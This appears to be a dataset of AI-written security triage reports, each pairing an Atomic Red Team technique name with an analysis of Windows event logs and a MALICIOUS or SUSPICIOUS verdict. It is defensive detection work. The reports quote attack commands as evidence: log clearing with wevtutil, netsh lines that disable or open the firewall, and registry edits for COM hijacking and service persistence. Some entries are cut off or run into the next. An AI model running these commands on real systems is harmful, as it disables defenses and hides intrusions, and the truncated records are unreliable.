3. **Suspicious Use of `wevtutil.exe`**:
   - `wevtutil.exe` is frequently used to clear event logs, as seen in several log entries, which corresponds with the log clearing evidence from the System and Security logs.

4. **User Involvement and High Integrity Level**:
   - The suspicious activities were executed by ""SERVER002\\admin_test"" with a High Integrity Level, suggesting that the user account has administrative privileges—heightening the risk associated with these actions.

5. **Normal Windows Updates for Edge**:
   - The logs show activities associated with `Microsoft Edge Update`, which appear legitimate and typical for system updates. These activities are not related to the suspicious activities performed by the user ""admin_test"".

Given these findings, the resolution for this investigation is **MALICIOUS**. The log file clearing, suspicious command execution, and use of tools to manipulate system files strongly indicate malicious intent and activities. 

**Guidance on How to Proceed**:
- Isolate the affected host (Server002) from the network to prevent potential lateral movement or exfiltration of data.
- Perform a thorough forensic analysis on the host to identify any additional malicious software and potential data breaches.
- Reset and review permissions for the user ""admin_test"" and other administrative accounts for unauthorized modifications.
- Review and enhance logging and alerting policies to detect similar activities in the future.
- Conduct a full security review and patch any identified vulnerabilities to prevent recurrence.
"
Blackbit - Disable Windows Firewall using netsh firewall,"Upon analyzing the provided Windows event logs for the host Server002, several events stand out that may indicate suspicious or malicious activity:

1. **Log File Clearing:**
   - System Event ID 104 and Security Event ID 1102 indicate that log files in the ""System"" and ""Windows PowerShell"" channels were cleared. These actions were performed by the user ""admin_test."" Log clearing can be a tactic used by attackers to cover their tracks by removing records of their malicious activities.

2. **Wevtutil Usage:**
   - There are multiple instances of the ""wevtutil"" command being used to clear event logs (Sysmon, Application, and Security logs) by the user ""admin_test."" The command `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, for example, indicates an attempt to clear the Sysmon logs, which is a common technique used in post-exploitation to delete evidence.

3. **Process Execution and Privilege Usage:**
   - Sysmon EventID 1 and 5 describe executions with elevated privileges. Particularly, the execution of `cmd.exe` with the command line argument `/c netsh firewall set opmode mode=disable` to disable the firewall is highly suspicious. This action indicates an unauthorized change to the security settings to potentially allow unauthorized access or lateral movement.

4. **Use of Built-in Tools:**
   - Several native Windows tools like `whoami.exe`, `hostname.exe`, and `netsh.exe` have been executed. While their execution is not inherently malicious, the context, timing, and frequency, particularly when associated with log clearing and firewall configuration changes, suggest potential misuse in a malicious context.

The combination of event log clearing, the use of administrative commands to disable firewall settings, and the execution of commands that can manipulate and hide system configurations strongly suggest malicious intent.

**Assessment:** The evidence from the logs indicates clear malicious activity. The actions performed by the user ""admin_test"" point towards post-exploitation activities aimed at maintaining stealth and reducing the host's security posture.

**Resolution: MALICIOUS**

**Guidance on Proceeding:**
- Immediately isolate the affected host, Server002, from the network to prevent further compromise.
- Conduct a thorough investigation into the user account ""admin_test"" to determine the point of entry and whether the account was compromised.
- Review and strengthen security policies, especially around administrative logins and PowerShell usage.
- If feasible, restore the system to a known good state before the compromise took place.
- Implement enhanced monitoring for suspicious activities and configure alerts for any subsequent attempts to disable security controls or clear logs."
Activate Windows NoFind Group Policy Feature,"Upon reviewing the provided Windows event logs, here is the detailed analysis and assessment:

1. **Event Log Clearing**:
   - Security Event ID 1102 indicates that the security log was cleared by the user `admin_test` at `2024-10-24 15:20:44.7899534`. This action is often associated with attempts to hide malicious activities.
   - System Event ID 104 also indicates log clearing activities in the System and Windows PowerShell channels, also executed by `admin_test`. This is equally suspicious since clearing logs can be a way to cover tracks.

2. **Time Manipulation**:
   - Security Event ID 4616 shows instances of time manipulation. The time was set back from `2024-10-24 15:20:46.9642446` to `2024-10-24 15:20:44.8913532`. Time rollbacks are suspicious because they can be used to manipulate the timeline of events, particularly useful in evading detection.

3. **Registry Modification**:
   - Sysmon Event ID 1 and subsequent logs indicate the execution of `cmd.exe` with a command to modify the registry at `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`. The command adds a policy to disable the search function (`NoFind`), which is suspicious as it modifies user experience settings and could be part of a tactic to evade detection or interfere with system investigation.

4. **Process Execution**:
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `admin_test`. While `wevtutil.exe` is used to manage event logs, the pattern of its usage together with subsequent log clearing is suspicious.
   - The execution of command line utilities like `whoami.exe` and `HOSTNAME.EXE` in this context could be part of reconnaissance activities, possibly checking for user privileges or system identity.

**Assessment and Resolution**:
- The combination of log clearing, time manipulation, registry modification, and certain process executions distinctively points toward malicious behavior. Clearing security logs and altering system time could imply an attempt to manipulate audit trails. Registry modifications related to disabling search functionality and processes executed outside typical contexts (like `\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1`) add to the suspicion.
- **Resolution**: MALICIOUS - The cumulative evidence across multiple event types suggests malicious intent, likely aiming to cover the tracks of unauthorized activities.

**Guidance on How to Proceed**:
- Immediate steps should include conducting a deeper investigation, isolating the affected host, and performing a comprehensive analysis to identify any unauthorized access or changes in the system.
- Review other systems in the network for similar indicators of compromise.
- Conduct a security posture review and patch any vulnerabilities that could have been exploited.
- Evaluate and strengthen security monitoring and logging configurations to prevent future incidents.

Consider reaching out to a specialized incident response team for a detailed forensic analysis and remediation strategy."
InstallUtil HelpText method call,"Based on the analysis of the provided Windows event logs, several indicators of potentially suspicious activities are identified, suggesting the need for further investigation:

1. **Event Log Clearing**:
   - Security Log (EventID: 1102): The event logs indicate that the security log was cleared by a user ""admin_test"". Event log clearing is a common tactic used by attackers to cover their tracks.
   - System Log (EventID: 104): Similar actions are recorded where the system and Windows PowerShell logs were also cleared around the same time. This combination of actions is indicative of potential malicious intent.

2. **Unusual PowerShell Activity**:
   - A series of PowerShell events (EventID: 600 and 800 in the PowerShell log) show execution of scripts and dynamic assembly creation through `Add-Type`. The use of `InstallUtilTestHarness.ps1` and the file `T1218.004.dll` suggests execution or testing of techniques listed in the Atomic Red Team framework, which is often used to simulate attack techniques for threat detection testing. However, without explicit authorization, these activities could indicate unauthorized actions or a potential compromise.

3. **Sysmon Logs Indicating Process Creation**:
   - Multiple Sysmon events show PowerShell executing commands, such as `wevtutil.exe cl Security`, ""cl System"", and ""cl Windows PowerShell"", to clear logs. These actions are often associated with malicious activities to remove traces.
   - Additionally, the logs show the execution of binaries like `csc.exe` and `InstallUtil.exe`, indicative of potential code compilation and installation utility execution, which can be exploited for privilege escalation or code execution.

4. **Unusual .NET Activities**:
   - The execution of `InstallUtil.exe` with Command Line arguments `/? C:\Users\ADMIN_~1\AppData\Local\Temp\T1218.004.dll` is unusual outside development environments. `InstallUtil` has been known to be leveraged in Living-off-the-Land (LotL) attacks for executing arbitrary code.

### Assessment
The combination of event log clearing, unauthorized PowerShell activities, dynamic assembly execution, and utilization of .NET Framework components supports the assessment of suspicious activities that could potentially indicate malicious behavior.

### Resolution
Based on the above observations, the resolution is:
- **SUSPICIOUS**: The activities described in the logs contain indicators that require further investigation to conclusively determine intent and potential impact. Immediate steps should be taken to investigate these incidents, including verifying whether the activities were authorized, the presence of any malicious payloads, and reviewing any additional logs or alerts that may support these findings.

### Guidance on How to Proceed:
1. **Conduct a Full Investigation**:
   - Verify the legitimacy of the actions performed by the ""admin_test"" account. Confirm if actions were authorized for simulation or testing purposes.
   - Examine the files related to `InstallUtilTestHarness.ps1` and any associated scripts or DLLs for malicious content.

2. **Check for Persistence and Lateral Movement**:
   - Investigate any changes made to system configurations or persistent mechanisms correlated to these activities.
   - Review other systems and accounts for unusual access or related suspicious activities.

3. **Enhance Monitoring and Detection**:
   - Implement and ensure robust monitoring for PowerShell and event log activities to detect and alert potential malicious behavior promptly.
   - Utilize behavior-based and anomaly detection solutions to identify such unusual activities early.

4. **Coordinate an Incident Response**:
   - If malicious activity is confirmed, initiate an incident response to contain and eradicate threats.
   - Engage with security teams or experts to restore the integrity of affected systems and log auditing measures in place to prevent future occurrences."
AMSI Bypass - Override AMSI via COM,"After analyzing the provided log entries from the Windows host, here are the observations:

1. **Sysmon Logs:**
   - The `whoami.exe` and `conhost.exe` processes are observed multiple times. The `whoami.exe` is a legitimate system tool to identify the user executing the command.
   - A significant part of these logs involve execution of `wevtutil.exe` with the command line arguments to clear logs (e.g., ""wevtutil.exe cl Microsoft-Windows-Sysmon/Operational""). This can be a method used by attackers to hide their tracks by clearing event logs.
   - Another notable detail is the execution of `cmd.exe` with a command causing registry modification: `""cmd.exe"" /c REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f` which seems suspicious as it tries to load a non-existent DLL, which is often a tactic used to establish persistence or to prepare for further actions.
   - Multiple activities are executed under the user `SERVER002\admin_test` with high integrity level, indicating potential misuse of an administrative account.

2. **System and Security Logs:**
   - Event ID 104 from the System logs shows the event logs being cleared by the `admin_test` user account for both the System and Windows PowerShell logs.
   - Event ID 1102 from the Security logs indicates that the security logs were cleared by the same user, `admin_test`. This is a common tactic used by attackers to cover traces of malicious activity.

3. **Edge Update Activity:**
   - Multiple entries for `MicrosoftEdgeUpdate.exe` and related components are seen, but these appear to be part of routine updates for Microsoft Edge. The execution context (NT AUTHORITY\SYSTEM) and paths indicate normal update activities.

4. **TimeChange Activity:**
   - There is a Kernel-General (Event ID 1) indicating a time change on the system. While the event itself doesn't immediately appear suspicious, time changes without legitimate reason could be a concern, especially when combined with other suspicious activities.

**Assessment:**
- **Log clearance events** in conjunction with suspicious registry modification commands and the execution of system utilities by an administrative user suggest an attempt to cover malicious activity.
- The consistency of using a legitimate administrative account increases the likelihood of compromise or misuse of credentials.

**Conclusion:** 
**Resolution: MALICIOUS**

**Recommendations:**
- Immediately investigate the `admin_test` account for unauthorized access or misuse.
- Review security policies regarding the use of administrative privileges and account logins.
- Conduct a thorough examination of the file system and memory for additional signs of compromise or malicious binaries.
- Restore a backup of the event logs, if possible, and continue monitoring for similar suspicious activities."
Compile After Delivery using csc.exe,"Based on the provided Windows event logs, several activities stand out which may indicate suspicious or potentially malicious behavior. Here are the key observations:

1. **Event Log Clearing:**
   - Multiple events (EventID: 104 in System log, EventID: 1102 in Security log) indicate that logs from the System, Security, and Windows PowerShell channels were cleared using the `wevtutil.exe` tool. This is a frequent tactic used by attackers to cover their tracks after engaging in malicious activity.

2. **Suspicious Command Execution:**
   - There are Sysmon logs indicating the execution of command prompt (`cmd.exe`) and utilities like `whoami.exe`, `hostname.exe`, and PowerShell. These are legitimate system utilities, but in this context and sequence, they might be used to gather information about the system and its users post-compromise.

3. **Wevtutil Usage:**
   - Wevtutil is specifically used to manipulate event logs, and here it's seen clearing various logs without any associated benign justification. This is red-flagged behavior, especially when coupled with admin privileges.

4. **Privilege Escalation:**
   - Event 4672 in the Security log shows that the user ""admin_test"" was granted a series of high privileges, including SeDebugPrivilege, SeTakeOwnershipPrivilege, and SeBackupPrivilege, which are typically unnecessary for common administrative tasks and could be used for privilege escalation or to perform malicious activities undetected.

5. **Compilation Activity:**
   - There is evidence of the .NET Compiler (csc.exe) being used, with the command line showing it compiling a C# source file, likely a test or proof-of-concept script from the AtomicRedTeam framework. This is an indication of simulated adversary testing or post-exploit activity.

6. **Remote Logon Sessions:**
   - EventID 4624 indicates NTLM logon from IP `192.168.0.102` using admin_test account, and given the context, it might be unusual because of the potential for lateral movement or unauthorized remote access.

**Conclusion: SUSPICIOUS**

The combination of event log clearance, privilege escalation, suspicious command executions, and potential initial access and lateral movement indicators suggest the presence of activities consistent with post-compromise behavior. While there is a possibility that this could be part of a legitimate penetration test or a test run of detection capabilities (as suggested by the reference to AtomicRedTeam), the risk cannot be discounted without further investigation.

**Guidance:**
- Immediately review access logs and network connections to and from the IP `192.168.0.102`.
- Investigate the legitimacy of the `admin_test` account's activities and its necessity on the system.
- Check for any recent changes or deployments via administrative accounts around the time these events were triggered.
- Monitor for any unexplained network traffic, especially outbound flows that may suggest data exfiltration.
- If there's no legitimate security testing team responsible for these events, consider this a potential compromise and proceed with containment, eradication, and recovery actions."
Rundll32 with Ordinal Value,"Based on the analysis of the provided Windows event logs, there are several indicators of suspicious and potentially malicious activities:

1. **Log Clearing Activity**:  
   - There are events that indicate the clearing of event logs, specifically the Security, System, and Windows PowerShell logs, using the `wevtutil` command by the `admin_test` user. This activity is documented in both Sysmon and Security logs. Clearing event logs is often a tactic used by attackers to cover their tracks after conducting malicious activities. 
   - **Sysmon Logs**: Multiple entries for `wevtutil.exe` clearing logs such as Security, System, and PowerShell, executed by the `admin_test` user.

2. **Execution of Rundll32 with DLL Suspicious Behavior**:  
   - The log entry shows `cmd.exe` executing `rundll32.exe` with a DLL from a temporary directory (`""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.010\\bin\\AllTheThingsx64.dll""`). This is often associated with code execution from malicious payloads delivered via DLL side-loading techniques.
   - **Sysmon Logs**: Entry shows `rundll32.exe` being invoked with a DLL from a suspicious path.

3. **Excessive Privileged Operations**:  
   - Several log entries (Security EventID 4672) show the `admin_test` user having been granted an extensive list of privileges typically not required for regular day-to-day operations. Some of these include `SeTakeOwnershipPrivilege`, `SeDebugPrivilege`, and `SeImpersonatePrivilege`.

4. **Unusual Remote Logons**:  
   - Security log entries show logons involving NTLM from a remote computer (DESKTOP-3HL5B2P) which could indicate lateral movement within the network.
   - **Security Logs**: Multiple instances of logon type 3 (network) for the `admin_test` user without associated valid context or reason. This corresponds to a remote session potentially indicating an external connection.

5. **Execution of Utility Commands by Admin User**:  
   - Commands like `HOSTNAME.EXE` and `whoami.exe` being executed by `admin_test` user, often used for recon activities on a system.

Given the evidence presented in the logs, the activities seem orchestrated towards stealth, privilege escalation, and potential lateral movement within the network, alongside activities indicative of attempts to evict forensic evidence (log clearing).

**Assessment**: The analysis suggests there is a high likelihood of a compromise based on the suspicious activity involving log clearing, privilege escalations, and potentially malicious DLL execution.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the affected host from the network to prevent further propagation.
- Conduct a full forensic investigation on `Server002` to understand the extent of the compromise.

ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI,"The analysis of the provided event logs shows a series of activities on the Windows host that suggest suspicious activity, potentially indicating a compromise. Here is a detailed analysis of the events:

### Suspicious Activities Identified:

1. **PowerShell Execution (Sysmon Event ID 1 and 5):**
   - PowerShell is executed by the user ""admin_test"" with a high integrity level, suggesting administrative privileges.
   - PowerShell is known for its legitimate uses, but it is also frequently used by attackers due to its powerful capabilities and ability to run scripts without being directly visible.

2. **Event Log Clearing (System and Security Logs):**
   - Log entries indicate that the user ""admin_test"" cleared logs in the following channels:
     - System Channel
     - Windows PowerShell Channel
     - Security Channel (Event ID 1102 in Security Log)
   - Clearing event logs is a common tactic used by attackers to cover their tracks and evade detection.

3. **Usage of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` (a command-line utility for managing event logs) were observed. This was used to clear logs, confirming potential malicious intent or at least an attempt to hide activities.

4. **Suspicious Use of `cmd.exe` with External Executables (Sysmon Event ID 1):**
   - An instance of `cmd.exe` executed with parameters involving ""plink.exe"" for creating an SSH connection to ""atomic.local"" using the root credentials. This indicates an attempt to create an outbound connection using potentially unauthorized or malicious means.

5. **Presence of Potentially Malicious Tools:**
   - Execution of ""plink.exe"" with options to connect via SSH is an indicator of possible data exfiltration or unauthorized network connection.

### Assessment:

Given the activities observed in the logs, particularly the execution of PowerShell scripts, the clearing of system and security logs, and the use of external executables to establish network connections, it can be reasonably concluded that these logs point towards:

- **Resolution: MALICIOUS**

  - Provide security awareness training to users on the implications of risky behavior, especially involving PowerShell and other scripting languages.

These steps are meant to contain and eliminate the threat, repair and strengthen system defenses, and prepare the organization for future potential incidents."
Service ImagePath Change with reg.exe,"After analyzing the provided Windows event logs, I have identified the following suspicious activities:

1. **Security Log (EventID 1102):** The security log indicates that logs were cleared by the user ""admin_test."" Log clearance is a common tactic used by attackers to cover their tracks.

2. **Sysmon Logs:**
   - Multiple instances of the `wevtutil.exe` being executed. This command-line utility is used for clearing event logs.
   - We observe consecutive executions of `wevtutil.exe` clearing logs in various channels (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). This aligns with attempts to cover tracks by clearing logs.
   - A suspicious command was executed using `cmd.exe` to modify the registry: `reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\calcservice"" /f /v ImagePath /d ""%windir%\system32\cmd.exe""`. This entry refers to creating a service named ""calcservice"" with a potentially malicious configuration. Writing to registry keys for service creation is indicative of persistence mechanisms used by malware.
   - The process executions and command-line arguments indicate an abuse of administrative privileges for these actions, most likely malicious intent.

3. **System Log (EventID 104):** Multiple events indicate the clearing of the System and Windows PowerShell event logs by the same user account ""admin_test.""

**Assessment:**

The actions documented in the logs, such as the clearing of various event logs, registry manipulation to add a potentially malicious service, and the use of multiple system utilities like `wevtutil.exe` and `reg.exe`, are indicative of an attempt to conduct malicious activities on the host. The account ""admin_test"" is primarily involved, implying that the potential compromise level is high.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

- **Immediate Containment:** Isolate the machine from the network to prevent further compromise or data exfiltration.
- **Credential Audit:** Review and reset the credentials, particularly any privileged accounts like ""admin_test.""
- **Full Forensic Analysis:** Conduct a deeper investigation to identify any other malicious changes or indicators of compromise (IoCs) across the system.
- **Log Review and Monitoring:** Ensure centralized logging is active and monitor for similar activities across the network.
- **Identify and Close Vulnerabilities:** Perform a full security assessment to identify how the attacker gained initial access and close these vulnerabilities.
- **Patch and Update:** Ensure all systems are fully patched and updated to mitigate known vulnerabilities.
- **User Awareness Training:** Implement a training program for users to understand potential security risks and the importance of maintaining log integrity."
Microsoft.Workflow.Compiler.exe Payload Execution,"Based on the analysis of the provided logs, I have identified several events that denote potentially suspicious activity. Here's a detailed breakdown:

1. **Event Log Clearing**:
   - **Security Event ID 1102 (LogFileCleared)** and **System Event ID 104**: Both logs indicate that the Security and System event logs were cleared by the user `admin_test`. This action is generally considered anomalous and potentially malicious, as log clearing is usually done to cover up activities on a system.

2. **Wevtutil.exe Usage**:
   - Sysmon logs show multiple instances of `wevtutil.exe` being executed with the `cl` (clear) command against different logs (Microsoft-Windows-Sysmon/Operational, Application, System, Security). The responsible user is `SERVER002\admin_test`. This behavior aligns with attempts to clear logs on the machine, which combined with the log clear entry in the Security log, is highly suspicious.

3. **Suspicious PowerShell Activity**:
   - There are multiple instances of PowerShell being executed with scripts related to `AtomicRedTeam`, particularly under the user `SERVER002\admin_test`. These scripts seem to simulate or execute techniques based on project Atomic Red Team, a known open-source library of tests for detecting cyber threats. This could suggest either a red team exercise or potential misuse by an attacker.

4. **Unhandled Exception**:
   - In the Application log `microsoft.workflow.compiler.exe` encountered an unhandled exception due to `System.IO.DirectoryNotFoundException`. While this can be benign, it could also be a sign of poorly executed or malicious scripts trying to access non-existent paths, especially considering the context involving Atomic Red Team scripts.

5. **Credential Reading Failures**:
   - Security Event ID 5379: Multiple instances of credential reading failures associated with `admin_test`. Normally, these are less suspicious in isolation but, in combination with cleared logs and PowerShell activity, they add to the suspicious narrative.

Conclusively, the combination of log clearing, the use of `wevtutil.exe` to clear event logs, suspicious PowerShell usage potentially simulating attack techniques, and failed credential accesses all contribute to a concern for potential malicious activity.

## Resolution
**SUSPICIOUS** - The identified activities do not conclusively point to active malicious compromise but exhibit characteristics that could indicate malicious behavior or a red team exercise. Further investigation is required to confirm the intent, including:
- Verifying if the `admin_test` user actions align with their role and permissions.
- Evaluating if the PowerShell activities were authorized and part of a testing exercise.
- Conducting a forensic investigation to ensure no undetected malicious activities or persistence mechanisms are present in the system."
Activities To Disable Secondary Authentication Detected By Modified Registry Value,"Upon analyzing the provided Windows event logs, several aspects stand out that may suggest suspicious or potentially malicious activity:

1. **Log Clearing Actions:**
   - The logs indicate multiple instances of the Windows Event logs being cleared, as shown by Event ID 104 in the System logs and Event ID 1102 in the Security logs. These actions are performed by the user ""admin_test"" and involve channels such as System and Windows PowerShell, which is unusual if executed without administrative tasks that need cleanup, as it can indicate an attempt to cover tracks.

2. **Use of Wevtutil:**
   - Several instances of the process `wevtutil.exe` are noted in the Sysmon logs, specifically using the ""cl"" (clear) command to clear logs in various channels. The use of `wevtutil.exe` with elevated privileges and in quick succession is a common tactic used by attackers to clear logs after malicious activities.

3. **Registry Modification via Command Line:**
   - The execution of `cmd.exe` and `reg.exe` to modify the Windows registry key `HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor` is uncharacteristic for normal user activity. Registry modifications are a common method of establishing persistence or disabling security mechanisms.

4. **Privilege Escalation:**
   - Security logs reveal Event ID 4672 indicating special privilege assignments (like SeDebugPrivilege, SeBackupPrivilege, etc.) to the user ""admin_test"". While this can occur for legitimate reasons, in the context of other malicious indicators, it raises concerns about potential privilege escalation activities.

5. **Edge Update Sequences:**
   - The logs show frequent executions of processes related to Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`) under NT AUTHORITY\SYSTEM. While these processes can be legitimate, the frequency and installation paths suggest they are used during a session with suspicious log clearance activities.

Based on the analysis of these logs, the activity observed is considered strongly indicative of malicious intent. The combination of log clearance, registry modification, privilege escalation, and the manner in which `wevtutil.exe` is employed aligns with patterns commonly associated with attempts to obscure unauthorized activities.

**Resolution: MALICIOUS**

**Recommended Actions:**
- Immediately isolate the affected host to prevent further potential spread or compromise.
- Conduct a comprehensive forensic analysis of the affected system to determine the full extent and impact of the compromise.
- Review and audit user accounts, especially those with administrative privileges.
- Implement stricter monitoring and alerting for log-clearing activities.
- Restore system logs from backups if available for precise incident reconstruction.
- Change credentials that might have been used or exposed during the compromise.
- Ensure that all security patches and updates are applied, especially for software like browsers with high exposure vulnerabilities."
Rundll32 execute payload by calling RouteTheCall,"The provided logs show several suspicious activities that could potentially indicate malicious behavior. A detailed analysis follows:

### Suspicious and Anomalous Behavior:

1. **Unusual PowerShell Command Execution:**
   - The PowerShell logs reveal the execution of the command: `powershell.exe & {rundll32.exe zipfldr.dll,RouteTheCall ""'%windir%\System32\calc.exe'""}`. This involves using `rundll32.exe` to execute `calc.exe`, which is unusual as `rundll32.exe` is traditionally used for running DLL functions. This technique can be employed to evade detection and execute payloads.

2. **Clearing of Windows Logs:**
   - The System, Security, and PowerShell log channels were cleared by the user ""admin_test"". Specifically, we see processes with the command `wevtutil.exe cl`, which is known to clear event logs. Clearing logs is a tactic often used to cover tracks after performing malicious actions on a system.

3. **Sequence of Process Creations:**
   - The processes related to `wevtutil.exe` all show consistent log entries about clearing logs at nearly the same time the suspicious PowerShell command was executed. This strongly correlates with an attempt to hide activities.

4. **Rundll32 Process Creation:**
   - The Sysmon log shows the creation of a `rundll32.exe` process with the command that echoes the PowerShell log entry. The use of `zipfldr.dll` and the execution of the `calc.exe` through `rundll32.exe` further raise suspicions as this is atypical behavior.

5. **User Activity and Logon Information:**
   - The user ""admin_test"" is noted to have performed most activities, including the logs clearance and the potentially malicious script execution. The high integrity level indicates elevated privileges, adding risk to misuse.

### Assessment:

The logs indicate potentially malicious activity. The execution of `rundll32.exe` to run a seemingly benign executable (`calc.exe`) using PowerShell, combined with immediate clearing of multiple event logs, raises alarms about an attacker's presence on or compromise of the host machine. These activities are consistent with obfuscation runs to execute other payloads and cover tracks.

Given the observed behavior and typical usage of `rundll32.exe` in offensive operations to blend into typical activities, associated with the evidence of logs being cleared, these logs suggest malicious intent.

### Conclusion:

**Resolution: MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Disconnect the affected machine from the network to prevent further malicious activities.
   - Gather forensic images of the system for deeper analysis and potential law enforcement engagement.
   - Reset passwords for involved user accounts.

2. **Further Investigation:**
   - Conduct full threat hunting across the network to identify if similar patterns exist elsewhere.
   - Analyze network traffic for suspicious connections or data exfiltration attempts.
   - Review administrative access and policies to restrict `rundll32.exe` misuse.

3. **Remediation:**
   - Restore cleared event logs if possible, and establish better logging practices and storage.
   - Consider deploying more aggressive monitoring for PowerShell and detailed process tracking.
   - Educate users on recognizing suspicious activities and verifying unexpected tasks or processes."
Mimic Ransomware - Allow Multiple RDP Sessions per User,"Upon reviewing the provided Windows event logs, I've identified several suspicious activities that could point to potential malicious activities or system misuse. Here's a detailed analysis:

### Suspicious Activities Identified:
1. **Command and Control Activity**:
   - The use of `cmd.exe` with command-line arguments to modify registry settings: 
     ```
     ""cmd.exe"" /c reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
     ```
     indicates a modification to the Terminal Services, allowing multiple sessions per user. This behavior might suggest an attempt to establish persistence or allow multiple remote sessions which can be a tactic used by attackers.

2. **Event Log Clearing**:
   - Multiple instances of wevtutil clearing event logs:
     ``` 
     C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational
     ""C:\\Windows\\system32\\wevtutil.exe"" cl Application
     ``` 
     Cleared logs include System, Security, and Windows PowerShell channels. Clearing logs can be an indicator of someone attempting to cover their tracks.

3. **Unexpected Time Change**:
   - Several events show that the system time has been reset:
     ```
     NewTime"":""2024-10-24 16:56:11.1450737"",""OldTime"":""2024-10-24 16:56:14.7117102""
     ```
     Time manipulation can be an indicator of an attacker trying to bypass security protocols that depend on time-based authentication or logging.

4. **High-Integrity Commands**:
   - Multiple high-integrity processes being executed:
     The logs show several utilities (e.g., `conhost.exe`, `wevtutil.exe`) executed with high integrity, indicative of elevated privileges which could suggest privilege escalation or malicious use of legitimate utilities.

5. **Unauthorized User Activity**:
   - There seems to be repeated usage of utilities to ascertain and control host details (e.g., `hostname.exe`, `whoami.exe`). While these could be part of administrative tasks, combined with other activities, it may indicate information gathering post-compromise.

### Assessment:
- The repetitive execution of utility commands for managing and clearing logs, combined with registry modifications and the time changes, suggests activities beyond normal administrative tasks. The systematic clearing of multiple logs is of particular concern as it may denote an attempt to cover tracks after executing potentially malicious activities.

### Resolution
Based on the identified activities and potential risks, I would classify these logs as **MALICIOUS**. The combination of registry editing, log clearing, privilege escalation attempts, and system time alterations are indicative of behavior consistent with that of an adversary attempting to obfuscate their actions.

### Guidance
1. **Immediate Response**:
   - Quarantine the affected system to isolate it from the network.
   - Conduct a thorough forensic investigation to determine if any other systems were affected or if data exfiltration occurred.

2. **Logs Review**:
   - Back up and secure the existing logs for further forensic analysis.
   - Review any external accesses during the timeframe of these actions to identify potential entry points.

3. **Security Measures**:
   - Implement enhanced monitoring for unusual activities, especially focusing on log clearing and registry changes.
   - Review and, if necessary, revoke the privileges of users executing high-integrity commands without clear justification.

4. **Future Prevention**:
   - Raise awareness and train staff on identifying unusual activities.
   - Evaluate and improve existing security controls, ensuring key security practices like logging and time integrity checks are working as intended."
CheckIfInstallable method call,"**Detailed Analysis of Logs:**

1. **Security Log:**
   - **Event ID 1102**: Indicates that the audit log on Server002 was cleared by the user `admin_test`. Clearing of logs is often a technique used by attackers to cover their tracks, especially if there is no legitimate reason for the logs to be cleared.

2. **Sysmon Log:**
   - **Event ID 1 & 5**: There are multiple process creation logs showing the use of `wevtutil.exe` to clear different event logs (Sysmon, Application, Security, and System). This aligns with the log clearance seen in the Security and System logs, further pointing to intentional log tampering.
   - **PowerShell Activity**: There are logs related to `powershell.exe` executing scripts from a path referencing `AtomicRedTeam`, and the presence of `T1218.004` indicates potentially malicious testing or execution of bypass techniques. The use of PowerShell to invoke compile operations and run potentially obfuscated scripts is a common tactic by threat actors.
   - The execution of `csc.exe` and `cvtres.exe` indicates code compilation, which combined with script execution can be a sign of suspicious behavior if not accounted for legitimate development processes.

3. **System Log:**
   - **Event ID 104**: Confirms the clearing of logs on specific channels by `admin_test`.

4. **Application Log:**
   - Entries related to `edgeupdate.dll` indicate the stopping of services, which might be part of an update routine; however, in the context of other suspicious activities, it warrants closer inspection to ensure it is legitimate.

5. **Windows PowerShell Log:**
   - **Event ID 600 & 800**: Logs indicate command executions and PowerShell script activities that align with suspicious or unauthorized testing activities (`AtomicRedTeam`). The inclusion of specific assemblies and compilation could mean the execution of malicious code using PowerShell.

**Assessment:**
- The combination of audit log clearance, script execution from a potentially suspicious path (AtomicRedTeam), and use of built-in Windows tools (e.g., `wevtutil.exe`, `powershell.exe`, `csc.exe`) in this manner strongly suggest that the activity observed is consistent with known tactics, techniques, and procedures (TTPs) of adversaries aiming to evade detection and execute unauthorized actions.

**Threats/Risks Identified:**
- Unauthorized log clearance to remove evidence of activities.
- Possible execution of potentially malicious scripts via PowerShell.
- Use of `AtomicRedTeam` TTPs, known for security testing and exploitation.

**Resolution:**
- **MALICIOUS**: The activities detected are consistent with known malicious behaviors aimed at obscuring actions taken on the system and potentially executing unauthorized and harmful scripts.

**Guidance:**
1. Immediately review and potentially lock out the account `admin_test` as it was used to carry out these actions.
2. Conduct a thorough forensic analysis of the system to identify any further signs of compromise or unauthorized changes.
3. Consider restoring from a known-good backup and ensure all patches and security updates are applied.
4. Implement additional monitoring and alerting around key events like log clearance and PowerShell execution, to quickly identify similar activities in the future."
Allow SMB and RDP on Microsoft Defender Firewall,"Upon analyzing the provided Windows event logs, several events stood out as potentially suspicious. Here is a detailed breakdown of the findings:

1. **Use of `wevtutil.exe`:** 
   - Multiple instances of `C:\Windows\System32\wevtutil.exe` process execution are observed with command-line arguments indicating the clearing of event logs (`cl` stands for ""clear log"").
   - This action was performed by a user `SERVER002\admin_test`, which synchronized with high integrity level executions. Clearing event logs is often a technique used by threat actors to hide their tracks after conducting malicious activities.

2. **Security and System Logs Clearing:**
   - The Security event log (Event ID 1102) and System event log (Event ID 104) were both cleared around the same timestamp. This simultaneous clearing suggests an attempt to eliminate traces of prior activities performed under the user `admin_test`.

3. **Command Execution to Modify Firewall Rules:**
   - The execution of `cmd.exe` with the command to enable ""Remote Desktop"" and ""File and Printer Sharing"" through firewall rules: 
     ```
     ""cmd.exe"" /c netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes & netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes
     ```
